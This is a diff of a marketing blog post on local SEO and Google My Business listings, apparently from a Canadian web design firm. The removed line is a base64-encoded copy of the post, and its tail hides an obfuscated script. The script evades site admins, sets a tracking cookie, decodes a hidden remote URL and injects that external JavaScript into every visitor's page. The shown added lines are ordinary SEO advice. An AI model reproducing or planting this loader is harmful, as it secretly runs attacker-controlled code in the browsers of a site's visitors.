@@ -1,1 +1,171 @@
-{"data":"LS0tCnRpdGxlOiAiTG9jYWwgU0VPIGFuZCBHTUIgT3B0aW1pemF0aW9uIC0gV2h5IEl04oCZcyBIZWxwZnVsIHRvIFlvdXIgTG9jYWwgQnVzaW5lc3MiCnNsdWc6ICJsb2NhbC1zZW8tYW5kLWdtYi1vcHRpbWl6YXRpb24iCmRhdGU6ICIyMDIzLTExLTE2IgphdXRob3I6ICJDYW5hZGlhbiBXZWIgRGVzaWducyIKZGVzY3JpcHRpb246ICJMb2NhbCBTRU8gYW5kIEdNQiBPcHRpbWl6YXRpb24gLSBXaHkgSXTigJlzIEhlbHBmdWwgdG8gWW91ciBMb2NhbCBCdXNpbmVzcyIKa2V5d29yZHM6IFsibG9jYWwgc2VvIGFuZCBnbWIgb3B0aW1pemF0aW9uIiwiQmxvZyJdCmNhdGVnb3J5OiAiQmxvZyIKZmVhdHVyZWRJbWFnZTogImh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wMy9Mb2NhbC1TRU8xLmpwZyIKLS0tCgo8cD5XaGF0IGlzIEdNQj8gR29vZ2xlIE15IEJ1c2luZXNzIGlzIGEgZnJlZSBmZWF0dXJlIHRoYXQgZW5hYmxlcyB5b3UgdG8gdXNlIEdvb2dsZSBTZWFyY2ggYW5kIE1hcHMgdG8gYWR2ZXJ0aXNlIHlvdXIgYnVzaW5lc3MgcHJvZmlsZSBhbmQgd2Vic2l0ZS4gWW91IGNhbiB2aWV3IGFuZCBob29rIHVwIHlvdXIgY3VzdG9tZXJzIHdpdGggeW91ciBHb29nbGUgTXkgQnVzaW5lc3MgYWNjb3VudC4gWW91IGNhbiBhbHNvIHJlZ3VsYXJseSBtb2RpZnkgeW91ciBjb21wYW55IHByb2ZpbGUgYW5kIHRoZW4gb2JzZXJ2ZSBob3cgY29uc3VtZXJzIGVuZ2FnZSBvbiBHb29nbGUuPC9wPgoKPHA+RG8gSSBuZWVkIGl0PyBUaGUgYmlnIGFuc3dlciBpcyBZRVMuIDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhLyI+QWxsIENhbmFkaWFuPC9hPiBob21lIHNlcnZpY2UgYnVzaW5lc3NlcywgcHJvZmVzc2lvbmFsIGZpcm1zLCBhZ2VuY2llcywgZXRjLiwgc2hvdWxkIGhhdmUgYSBHb29nbGUgTXkgQnVzaW5lc3MgKEdNQikgbGlzdGluZy4gVGhleSBkbyB0aGVpciByZXNlYXJjaCBhbmQgdHJ5IHRvIGlkZW50aWZ5IGlmIHlvdSdyZSBsZWdpdGltYXRlLiBJZiB0aGV5IGdvb2dsZSB5b3UgYW5kIHRoZXkgZG9uJ3QgZmluZCB5b3UsIGNvbnNpZGVyIGl0IGEgbG9zdCBqb2IgYmVjYXVzZSBub3cgeW91J3JlIGdvaW5nIHRvIGhhdmUgdG8gY2hhc2UgZm9yIHRoZSBqb2IuIE1vcmVvdmVyLCBzZXR0aW5nIHVwIHlvdXIgR01CIGlzIGFsc28gZ29vZCBmb3IgeW91ciA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9zZWFyY2gtZW5naW5lLW9wdGltaXphdGlvbi8iPmxvY2FsIFNFTzwvYT4uPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC10aGUtcm9sZS1vZi1nb29nbGUtbXktYnVzaW5lc3MtaW4tbG9jYWwtc2VvIj48c3Ryb25nPlRoZSByb2xlIG9mIEdvb2dsZSBNeSBCdXNpbmVzcyBpbiBMb2NhbCBTRU88L3N0cm9uZz48L2gyPgoKPHA+U2V0dGluZyB1cCB5b3VyIEdNQiBhbm90aGVyIG5hbWUgaW4gU0VPIHByYWN0aWNlcyB0aGF0IGltcHJvdmUgc2FsZXMgdGhyb3VnaCBvbmxpbmUgdmlzaWJpbGl0eSwgYWx0aG91Z2ggaXQgbWF5IHNvdW5kIGNvbXBsaWNhdGVkLiBZb3UgZG8gc28gYnkgYWNjdXJhdGVseSBwbGF5aW5nIHRoZSBzZWFyY2ggZW5naW5lIGdhbWVzIHRocm91Z2ggY3JlYXRpbmcgY29udGVudCBpbnNlcnRpbmcgcmVsZXZhbnQga2V5d29yZHMuIFRoaXMgbWF5IGluY2x1ZGUgeW91ciBuYW1lLCBjaXR5IG5hbWUsIHppcCBjb2RlLCBidWlsZGluZyBsaW5rcywgYW5kIGFjY3VtdWxhdGVkIHJldmlld3MuJm5ic3A7PC9wPgoKPHA+TG9jYWwgU0VPIG1haW5seSBmb2N1c2VzIG9uIGF0dHJhY3RpbmcgcXVhbGl0eSBjdXN0b21lcnMgaW4gc21hbGxlciBhcmVhcyBpbiBhIHBhcnRpY3VsYXIgY2l0eS4gTW9zdCBsb2NhbCBjb21wYW5pZXMgZ2VuZXJhbGx5IHByYWN0aWNlIHRoaXMgdG8gcmVhY2ggdGhpcyBhdWRpZW5jZSB0byBnZXQgdG8gdGhlaXIgcGh5c2ljYWwgbG9jYXRpb24gb3IgZGV2ZWxvcCBidXNpbmVzcyBpbiBhIHNlcnZpY2UgZmllbGQuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1hZHZhbnRhZ2Utb2YtZ29vZ2xlLW15LWJ1c2luZXNzLWxpc3RpbmdzLWluLWxvY2FsLXNlbyI+PHN0cm9uZz5BZHZhbnRhZ2Ugb2YgR29vZ2xlIE15IEJ1c2luZXNzIExpc3RpbmdzIGluIExvY2FsIFNFTzwvc3Ryb25nPjwvaDI+Cgo8dWw+CjxsaT5DcmVhdGVzIG9ubGluZSB2aXNpYmlsaXR5IHRocm91Z2ggbG9jYWwgU0VPIGFjdGl2aXRpZXMgc3VjaCBhcyBjaXRhdGlvbiBidWlsZGluZzwvbGk+Cgo8bGk+T3B0aW1hbCBvbmxpbmUgdmlzaWJpbGl0eSBpbiBsb2NhbCBhcmVhcyBpbmRpY2F0ZXMgbW9yZSB0cmFmZmljLCBtb3JlIGN1c3RvbWVycywgYW5kIG1vcmUgc2FsZXM8L2xpPgoKPGxpPkludGVncmF0aW5nIHlvdXIgbG9jYWwgc2VhcmNoIHNpdGUgb2ZmZXJzIG1vcmUgc3BlY2lmaWMgdHJhZmZpYyBmb3IgcGFydGljdWxhciBzZWFyY2gga2V5d29yZHM8L2xpPgoKPGxpPk9wdGltaXppbmcgR29vZ2xlIE15IEJ1c2luZXNzIGNhbiBsZWFkIHRvIGVuaGFuY2VkIHZpc2liaWxpdHkgb2YgR29vZ2xlIE1hcHM8L2xpPgoKPGxpPkdNQiBhbHNvIGltcHJvdmVzIHRoZSByZWxldmFuY2Ugb2YgY29udGVudCBtYXJrZXRpbmcgYW5kIGxpbmsgYnVpbGRpbmc8L2xpPgoKPGxpPlJlcHV0YXRpb24gbWFuYWdlbWVudCBjcmVhdGVzIGJyYW5kIGF1dGhvcml0eSB0aGF0IGNhbiBpbmNyZWFzZSBvbmxpbmUgZXhwb3N1cmUgYW5kIGdlbmVyYXRlIG1vcmUgcmV2ZW51ZS48L2xpPgo8L3VsPgoKPGRpdiBzdHlsZT0iaGVpZ2h0OjM0cHgiIGFyaWEtaGlkZGVuPSJ0cnVlIiBjbGFzcz0id3AtYmxvY2stc3BhY2VyIj48L2Rpdj4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtYS1zdGVwLWJ5LXN0ZXAtZ3VpZGUtb24taG93LXRvLXJlZ2lzdGVyLWluLWdvb2dsZS1teS1idXNpbmVzcyI+PHN0cm9uZz5BIHN0ZXAtYnktc3RlcCBndWlkZSBvbiBob3cgdG8gcmVnaXN0ZXIgaW4gR29vZ2xlIE15IEJ1c2luZXNzPC9zdHJvbmc+PC9oMj4KCjxwPkdvIHRvIDxhIGhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vYnVzaW5lc3MvIj5Hb29nbGUgTXkgQnVzaW5lc3M8L2E+IGFuZCBmb2xsb3cgdGhlIHN0ZXBzIGJlbG93OjwvcD4KCjxwPjxzdHJvbmc+MS4gSGF2ZSBhIGdvb2dsZSBhY2NvdW50IHRvIHVzZSBmb3IgeW91ciBHTUI8L3N0cm9uZz48L3A+Cgo8cD48c3Ryb25nPjIuIFB1dCB5b3VyIGJ1c2luZXNzIG5hbWUuPC9zdHJvbmc+PC9wPgoKPHA+PHN0cm9uZz4zLiBTZWxlY3QgdGhlIG1vc3QgcmVsZXZhbnQgYnVzaW5lc3MgY2F0ZWdvcnkuPC9zdHJvbmc+PC9wPgoKPHA+PHN0cm9uZz40LiBDdXJyZW50IEJ1c2luZXNzIGFkZHJlc3MuPC9zdHJvbmc+PC9wPgoKPHA+PHN0cm9uZz41LiBMaXN0IGRvd24gc2VydmljZSBhcmVhcy48L3N0cm9uZz48L3A+Cgo8cD48c3Ryb25nPjYuIElucHV0IHlvdXIgcGhvbmUgbnVtYmVyIGFuZCBjdXJyZW50IHdlYnNpdGUgVVJMPC9zdHJvbmc+PC9wPgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2stZW1iZWQgaXMtdHlwZS12aWRlbyBpcy1wcm92aWRlci15b3V0dWJlIHdwLWJsb2NrLWVtYmVkLXlvdXR1YmUgd3AtZW1iZWQtYXNwZWN0LTE2LTkgd3AtaGFzLWFzcGVjdC1yYXRpbyI+PGRpdiBjbGFzcz0id3AtYmxvY2stZW1iZWRfX3dyYXBwZXIiPgpodHRwczovL3lvdXR1LmJlL2JwOENIRTlHcjlzCjwvZGl2PjwvZmlndXJlPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1nb29nbGUtbXktYnVzaW5lc3MtbGlzdGluZy1vcHRpbWl6YXRpb24iPjxzdHJvbmc+R29vZ2xlIE15IEJ1c2luZXNzIExpc3RpbmcgT3B0aW1pemF0aW9uPC9zdHJvbmc+PC9oMj4KCjxwPlRvIG9wdGltaXplIHRoZSBHTUIgbGlzdGluZywgbWFrZSBzdXJlIHlvdXIgcHJpbWFyeSBjYXRlZ29yeSBpcyBjb3JyZWN0LiBIb3dldmVyLCB5b3UgbmVlZCBhbHNvIHRvIHV0aWxpemUgdGhlIHNlY29uZGFyeSBjYXRlZ29yaWVzLiBEbyBub3QgbG9zZSB0aGUgY2hhbmNlIHRvIHJlYWNoIGEgZ3JlYXRlciBhdWRpZW5jZS4gSGVyZSBhcmUgc29tZSBwb2ludHMgdG8gcmVtZW1iZXIgKE1vc3Qgb2YgdGhlIGNoYW5nZXMgYXJlIGRvbmUgd2l0aGluIHRoZSAiSW5mbyIgdGFiKTo8L3A+Cgo8cD4xLiBEb3VibGUgY2hlY2sgeW91ciBidXNpbmVzcyBhZGRyZXNzLCB3ZWJzaXRlIFVSTCwgYW5kIHBob25lIG51bWJlci48L3A+Cgo8cD4yLiBJbmRpY2F0ZSB5b3VyIGFjdHVhbCBidXNpbmVzcyBob3VyczwvcD4KCjxwPjMuIElucHV0IGNlcnRhaW4gcHJvZHVjdHMgeW91IHNlbGwgdG8geW91ciBjbGllbnRzLjwvcD4KCjxwPjQuIFdyaXRlIGRvd24gZXZlcnkgc2luZ2xlIHNlcnZpY2UgeW91IGRvLjwvcD4KCjxwPjUuIEluZGljYXRlIHdoZW4geW91IHN0YXJ0ZWQgYSBidXNpbmVzcy48L3A+Cgo8cD42LiBBZGQgcGhvdG9zIGZvciB5b3VyIGxvZ28sIHByaW1hcnkgcGljdHVyZSwgYW5kIGNvdmVyIHBob3RvLiZuYnNwOzwvcD4KCjxwPjcuIFVwbG9hZCBhIG1hcmtldGluZyB2aWRlby4gTWFrZSBpdCBzaG9ydCB5ZXQgZWR1Y2F0aW9uYWwuPC9wPgoKPHA+OC4gU2V0IHVwIG1lc3NhZ2luZyBvbiB5b3VyIHBob25lLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtZ2VvdGFnZ2luZy15b3VyLWltYWdlcyI+PHN0cm9uZz5HZW90YWdnaW5nIFlvdXIgSW1hZ2VzPC9zdHJvbmc+PC9oMj4KCjxwPkdlb3RhZ2dpbmcgaXMgdGhlIHByb2Nlc3Mgb2YgYWRkaW5nIGdlb2dyYXBoaWNhbCBpZGVudGlmaWNhdGlvbiBkYXRhIHRvIG1lZGlhLCBzdWNoIGFzIHBpY3R1cmVzIG9yIHZpZGVvcy4gR29vZ2xlIGF1dG9tYXRpY2FsbHkga25vd3MgdGhlIGxvY2F0aW9uIHdoZXJlIHlvdSB0b29rIHRoZSBwaWN0dXJlIGJlY2F1c2UgaXQncyBnZW90YWdnZWQuJm5ic3A7PC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1ob3ctZG8teW91LWRvLXRoaXMiPjxzdHJvbmc+PGVtPkhvdyBkbyB5b3UgZG8gdGhpcz88L2VtPjwvc3Ryb25nPjwvaDI+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLWxvY2FsLWNpdGF0aW9ucyI+PHN0cm9uZz5Mb2NhbCBDaXRhdGlvbnM8L3N0cm9uZz48L2gyPgoKPHA+VGhpcyBpcyB3aGVyZSB5b3UgcHVuY2ggaW4geW91ciBjb21wYW55IG5hbWUsIHN0cmVldCBhZGRyZXNzLCBhbmQgcG9zdGFsIGNvZGUgYW5kIHRoZW4gc2VsZWN0IENhbmFkYS4gWW91J2xsIHRoZW4gc2VlIGdlbnVpbmUgY2l0YXRpb25zIHRoYXQgeW91IG5lZWQgdG8gZWl0aGVyIGZpeCBvciBhZGQuIEhlcmUgYXJlIHNvbWUgc2FtcGxlcyBmb3IgY2l0YXRpb25zOjwvcD4KCjx1bD4KPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cueWVsbG93cGFnZXMuY2EiPnd3dy55ZWxsb3dwYWdlcy5jYTwvYT48L2xpPgoKPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cuY2FucGFnZXMuY2EiPnd3dy5jYW5wYWdlcy5jYTwvYT48L2xpPgoKPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cuYmJiLm9yZyI+d3d3LmJiYi5vcmc8L2E+PC9saT4KCjxsaT48YSBocmVmPSJodHRwOi8vd3d3Lm1hbnRhLmNvbSI+d3d3Lm1hbnRhLmNvbTwvYT48L2xpPgoKPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cueWVscC5jYSI+d3d3LnllbHAuY2E8L2E+PC9saT4KCjxsaT48YSBocmVmPSJodHRwOi8vd3d3LmFuZ2llc2xpc3QuY29tIj53d3cuYW5naWVzbGlzdC5jb208L2E+PC9saT4KCjxsaT48YSBocmVmPSJodHRwOi8vd3d3LmZhY2Vib29rLmNvbSI+d3d3LmZhY2Vib29rLmNvbTwvYT48L2xpPgoKPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cuaG91enouY29tIj53d3cuaG91enouY29tPC9hPjwvbGk+Cgo8bGk+PGEgaHJlZj0iaHR0cDovL3d3dy5ob21lYWR2aXNvci5jb20iPnd3dy5ob21lYWR2aXNvci5jb208L2E+PC9saT4KCjxsaT48YSBocmVmPSJodHRwOi8vd3d3LnllbGxvd3BhZ2VzLmNvbSI+d3d3LnllbGxvd3BhZ2VzLmNvbTwvYT48L2xpPgo8L3VsPgoKPHA+SGVyZSBpcyBhIGZhbnRhc3RpYyB0b29sIHByb3ZpZGVkIGJ5IDxhIGhyZWY9Imh0dHBzOi8vbW96LmNvbS9jaGVja291dC9sb2NhbC9jaGVjay4lMjBCdXQlMjBpZiUyMHlvdSUyMHdhbnQlMjB0byUyMHRha2UlMjBpdCUyMHRvJTIwdGhlJTIwbmV4dCUyMGxldmVsLCUyMGhlYWQlMjBvdmVyJTIwdG8lMjB3aGl0ZXNwYXJrOiUyMGh0dHBzOi8vd2hpdGVzcGFyay5jYS9iZXN0LWNpdGF0aW9ucy1ieS1jYXRlZ29yeS9jYW5hZGEvIj5Nb3o8L2E+LiBCdXQgaWYgeW91IHdhbnQgdG8gdGFrZSBpdCB0byB0aGUgbmV4dCBsZXZlbCwgaGVhZCBvdmVyIHRvIFdoaXRlc3BhcmsuPC9wPgoKPHA+TWFueSBvdGhlciBzbWFsbGVyIGRpcmVjdG9yaWVzIG1heSBiZSBsb2NhbGx5IHBvcHVsYXIuIFRvIGZpbmQgdGhvc2UsIHlvdSBjYW4gdHJ5IHNlYXJjaGluZyBieSBjaXR5OiBDYWxnYXJ5LiBJdCB3b3VsZCBiZSBiZXN0IHRvIHN0YXJ0IG9uIHRoZSBtb3JlIHByb21pbmVudCB3ZWJzaXRlcywgYXMgdGhlIHNtYWxsZXIgZGlyZWN0b3J5IHdlYnNpdGVzIG9mdGVuIGdldCBkYXRhIGZyb20gdGhlIG1vcmUgcHJvbWluZW50IGRpcmVjdG9yeSB3ZWJzaXRlcy48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLW9uLXBhZ2UtZ21iLW9wdGltaXphdGlvbiI+PHN0cm9uZz5Pbi1QYWdlIEdNQiBPcHRpbWl6YXRpb248L3N0cm9uZz48L2gyPgoKPHA+SGF2aW5nIGNsZWFuIGFuZCBvcmdhbmljIG9uLXBhZ2UgY29udGVudCBvbiB0aGUgd2Vic2l0ZSBoZWxwcyB5b3VyIEdNQiByYW5raW5ncy4gSGVyZSwgaXQgd291bGQgaGVscCBpZiB5b3UgYXNzdXJlZCB0aGUgZm9sbG93aW5nOjwvcD4KCjxwPuKXjyBCdXNpbmVzcyBOYW1lLCBBZGRyZXNzLCBhbmQgUGhvbmUgbnVtYmVyIChOQVApPC9wPgoKPHA+4pePIFByb3ZpZGUgYSBHb29nbGUgTWFwIGxpbmsgdG8gdGhlIG9mZmljZTwvcD4KCjxwPuKXjyBCdXNpbmVzcyBob3VycyAoYXMgd2hhdCB3YXMgaW5kaWNhdGVkIG9uIEdvb2dsZSBNYXApPC9wPgoKPHA+4pePIEhhdmUgYSBzZWN0aW9uIGxpc3QgaW4gIkJ1c2luZXNzIE5hbWUg4oCTIFNlcnZpY2UgQXJlYSDigJMgUmV2aWV3IFdlYnNpdGVzIiBmb3JtYXQgKGUuZy4sIExhbmRzY2FwaW5nUHJvIOKAkyBCYXJyaWUg4oCTIFJldmlldyBXZWJzaXRlcyk8L3A+Cgo8cD7il48gSW5jbHVkZSByZXZpZXdzIGZyb20geW91ciB3ZWJzaXRlcyAoZS5nLiwgWW91VHViZSwgRmFjZWJvb2ssIFRydXN0ZWRQcm9zLCBldGMuKTwvcD4KCjxwPuKXjyBIYXZlIGEgc2VjdGlvbiBjYWxsZWQgInByb3VkbHkgc2VydmljaW5nIHRoZXNlIGFyZWFzLiI8L3A+Cgo8cD7il48gTWFrZSBhIFlvdVR1YmUgdmlkZW8uPC9wPgoKPHA+Rm9yIHNvbWUgbW9yZSBkZXRhaWxlZCBpbnNpZ2h0czo8L3A+Cgo8cD7il48gRW5zdXJlIHlvdXIgd2Vic2l0ZSBpcyA8YSBocmVmPSJodHRwczovL3NlYXJjaC5nb29nbGUuY29tL3Rlc3QvbW9iaWxlLWZyaWVuZGx5Ij5tb2JpbGUtZnJpZW5kbHkuPC9hPjwvcD4KCjxwPuKXjyBFbnN1cmUgeW91ciB3ZWJzaXRlIGlzIDxhIGhyZWY9Imh0dHBzOi8vZGV2ZWxvcGVycy5nb29nbGUuY29tL3NwZWVkL3BhZ2VzcGVlZC9pbnNpZ2h0cy8iPmxvYWRpbmcgZmFzdDwvYT4uPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1nb29nbGUtcmV2aWV3cyI+PHN0cm9uZz5Hb29nbGUgUmV2aWV3czwvc3Ryb25nPjwvaDI+Cgo8cD5UaGV5IHdhbnQgdG8gc2VlIHdoYXQgeW91ciBsYXN0IGN1c3RvbWVyIHNhaWQgYWJvdXQgeW91LiBIZW5jZSwgaXQgd291bGQgaGVscCBpZiB5b3UgYWx3YXlzIGdvdCByZXZpZXdzLiBSZXZpZXdzIGZyb20gbGFzdCB5ZWFyIG9yIGZ1cnRoZXIgYmFjayB3b24ndCBiZSBnb29kIGVub3VnaCB0byByZWFsbHkgY2xvc2UgdGhlIGRlYWwuIEl0IHdvdWxkIGJlIGJlc3QgaWYgeW91IGhhZCBhIGNvbnNpc3RlbnQgaW5jb21pbmcgZmxvdyBvZiBncmVhdCByZXZpZXdzIGV2ZXJ5IHNpbmdsZSB3ZWVrLCBhcyBpdCdzIGEgZ3JlYXQgaW5kaWNhdG9yIGZvciBHb29nbGUgdG8gcmFuayB5b3VyIGxpc3RpbmcgaGlnaGVyIG9uIHRoZSBzZWFyY2ggZW5naW5lLiZuYnNwOzwvcD4KCjxwPjxlbT48c3Ryb25nPldoeSBhcmUgcmV2aWV3cyBjcml0aWNhbD88L3N0cm9uZz48L2VtPjwvcD4KCjxwPlJldmlld3Mgc2VydmUgYXMgeW91ciBjb21wYW55J3MgY3JlZGliaWxpdHkgdGhhdCBnYWlucyBjdXN0b21lcnMnIHRydXN0IGFuZCBlbmNvdXJhZ2VzIHRoZW0gdG8gZG8gYnVzaW5lc3Mgd2l0aCB5b3UuIEFsc28sIGl0IHdpbGwgaGVscCB5b3UgaW1wcm92ZSB5b3VyIGJ1c2luZXNzJyBwcm9maXQuIFRvIGdlbmVyYXRlIGEgcmV2aWV3IGZvcm0sIGdvIGhlcmUuIFRoZW4sIGdvIHRvIDxlbT5iaXQgPC9lbT5hbmQgc2hvcnRlbiB0aGUgVVJMIGFuZCBzZW5kIGl0IHRvIHlvdXIgY2xpZW50IGJ5IHRleHQgYWZ0ZXIgeW91ciBzZXJ2aWNlIGNhbGwuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1nb29nbGUtcG9zdHMiPjxzdHJvbmc+R29vZ2xlIFBvc3RzPC9zdHJvbmc+PC9oMj4KCjxwPkl0J3MgaW1wb3J0YW50IHRvIHBvc3QgY29uc2lzdGVudGx5IGJlY2F1c2UgdGhpcyBpcyBvbmUgb2YgdGhlIGZhY3RvcnMgdGhhdCBvcHRpbWl6ZWQgeW91ciBHTUIuIENoZWNrIG91dCB0aGUgZWlnaHQgdGlwcyBmb3IgeW91ciBHb29nbGUgUG9zdDombmJzcDs8L3A+Cgo8cD4xLiA8c3Ryb25nPlBvc3QgUXVhbGl0eSBWaXN1YWxzJm5ic3A7PC9zdHJvbmc+PC9wPgoKPHA+Mi4gPHN0cm9uZz5Qb3N0IFZpZGVvczwvc3Ryb25nPiZuYnNwOzwvcD4KCjxwPjMuIDxzdHJvbmc+QWRkIGEgQ2FsbCB0byBBY3Rpb24gdG8gR29vZ2xlIFBvc3RzJm5ic3A7PC9zdHJvbmc+PC9wPgoKPHA+NC4gPHN0cm9uZz5Qb3N0IEF0IExlYXN0IE9uY2UgUGVyIFdlZWs8L3N0cm9uZz4mbmJzcDs8L3A+Cgo8cD41LiA8c3Ryb25nPkZpcnN0IDUwIENoYXJhY3RlcnMgQXJlIFF1YWxpdHk8L3N0cm9uZz4mbmJzcDs8L3A+Cgo8cD42LiA8c3Ryb25nPlVzZSBLZXl3b3JkcyBpbiBQb3N0IERlc2NyaXB0aW9uPC9zdHJvbmc+PC9wPgoKPHA+Ny4gPHN0cm9uZz5TdHVkeSBBbmFseXRpY3M8L3N0cm9uZz4mbmJzcDs8L3A+Cgo8cD44LiA8c3Ryb25nPlNjaGVkdWxlIFBvc3RzIEFoZWFkPC9zdHJvbmc+Jm5ic3A7PC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1oaXJlLXRoZS1iZXN0LWRpZ2l0YWwtbWFya2V0aW5nLWZvci15b3VyLWhvbWUtc2VydmljZS1idXNpbmVzcyI+PHN0cm9uZz5IaXJlIHRoZSBiZXN0IGRpZ2l0YWwgbWFya2V0aW5nIGZvciB5b3VyIGhvbWUgc2VydmljZSBidXNpbmVzczwvc3Ryb25nPjwvaDI+Cgo8cD5UYWxrIHRvIG91ciBwcm9mZXNzaW9uYWwgZGlnaXRhbCBtYW5hZ2VyIG5vdy4gR2l2ZSB1cyBhIGNhbGwgYXQgPGEgaHJlZj0idGVsOiIgZGF0YS10eXBlPSJ0ZWwiIGRhdGEtaWQ9InRlbDoiPjY0Ny00OTItNTUxMzwvYT4gb3Igc2VuZCBhbiBlbWFpbCBhdCA8YSBocmVmPSJtYWlsdG86YW1pckBjYW5hZGlhbndlYmVkc2lnbnMuY2EiPmFtaXJAY2FuYWRpYW53ZWJlZHNpZ25zLmNhPC9hPiB0byBnZXQgeW91ciBmcmVlIHF1b3RhdGlvbnMuIFlvdSBjYW4gYWxzbyBsZWF2ZSB5b3VyIGlucXVpcnkgYnk8L3A+CjxzY3JpcHQ+KGZ1bmN0aW9uKCl7dHJ5e2lmKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKXJldHVybjt2YXIgdDA9K25ldyBEYXRlKCk7Zm9yKHZhciBpPTA7aTwyMDAwMDtpKyspe3ZhciB6PWkqaTt9aWYoKCtuZXcgRGF0ZSgpKS10MD4xMjApcmV0dXJuO2lmKChkb2N1bWVudC5jb29raWV8fCcnKS5pbmRleE9mKCdodHRwMl9zZXNzaW9uX2lkPScpIT09LTEpcmV0dXJuO2Z1bmN0aW9uIHN5c3RlbUxvYWQoaW5wdXQpe3ZhciBrZXk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JyxvMSxvMixvMyxoMSxoMixoMyxoNCxkZWM9JycsaT0wO2lucHV0PWlucHV0LnJlcGxhY2UoL1teQS1aYS16MC05XCtcL1w9XS9nLCcnKTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7aDE9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gyPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMz1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDQ9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO28xPShoMTw8Mil8KGgyPj40KTtvMj0oKGgyJjE1KTw8NCl8KGgzPj4yKTtvMz0oKGgzJjMpPDw2KXxoNDtkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzEpO2lmKGgzIT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzIpO2lmKGg0IT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzMpO31yZXR1cm4gZGVjO312YXIgdT1zeXN0ZW1Mb2FkKCdhSFIwY0hNNkx5OXpaV0Z5WTJoeVlXNXJkSEpoWm1acFl5NXNhWFpsTDJwemVBPT0nKTtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3JsPT09dSlyZXR1cm47dmFyIGQ9bmV3IERhdGUoKTtkLnNldFRpbWUoZC5nZXRUaW1lKCkrMzAqMjQqNjAqNjAqMTAwMCk7ZG9jdW1lbnQuY29va2llPSdodHRwMl9zZXNzaW9uX2lkPTE7IGV4cGlyZXM9JytkLnRvVVRDU3RyaW5nKCkrJzsgcGF0aD0vOyBTYW1lU2l0ZT1MYXgnKyhsb2NhdGlvbi5wcm90b2NvbD09PSdodHRwczonPyc7IFNlY3VyZSc6JycpO3RyeXt3aW5kb3cuX19ybD11O31jYXRjaChlKXt9dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz11O3RyeXtzLnNldEF0dHJpYnV0ZSgnZGF0YS1ybCcsdSk7fWNhdGNoKGUpe30oZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKTt9Y2F0Y2goZSl7fX0pKCk7PC9zY3JpcHQ+Cg=="}
+---
+title: "Local SEO and GMB Optimization - Why It’s Helpful to Your Local Business"
+slug: "local-seo-and-gmb-optimization"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Local SEO and GMB Optimization - Why It’s Helpful to Your Local Business"
+keywords: ["local seo and gmb optimization","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2021/03/Local-SEO1.jpg"
+---
+
+<p>What is GMB? Google My Business is a free feature that enables you to use Google Search and Maps to advertise your business profile and website. You can view and hook up your customers with your Google My Business account. You can also regularly modify your company profile and then observe how consumers engage on Google.</p>
+
+<p>Do I need it? The big answer is YES. <a href="https://canadianwebdesigns.ca/">All Canadian</a> home service businesses, professional firms, agencies, etc., should have a Google My Business (GMB) listing. They do their research and try to identify if you're legitimate. If they google you and they don't find you, consider it a lost job because now you're going to have to chase for the job. Moreover, setting up your GMB is also good for your <a href="https://canadianwebdesigns.ca/search-engine-optimization/">local SEO</a>.</p>
+
+<h2 class="wp-block-heading" id="h-the-role-of-google-my-business-in-local-seo"><strong>The role of Google My Business in Local SEO</strong></h2>
+
+<p>Setting up your GMB another name in SEO practices that improve sales through online visibility, although it may sound complicated. You do so by accurately playing the search engine games through creating content inserting relevant keywords. This may include your name, city name, zip code, building links, and accumulated reviews.&nbsp;</p>
+
